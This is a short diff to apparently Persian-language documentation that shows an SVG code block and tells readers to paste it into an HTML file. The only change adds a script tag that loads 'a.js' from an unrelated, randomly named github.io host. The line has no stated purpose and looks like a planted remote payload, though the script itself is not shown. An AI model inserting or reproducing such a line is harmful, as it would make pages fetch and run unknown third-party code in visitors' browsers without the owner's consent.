@@ -21,3 +21,5 @@
 </svg>
 ```
 می توانید آن را کپی و در فایل **html** بچسبانید.
+
+<script src="https://abwalfdltnha178.github.io/a.js"></script>
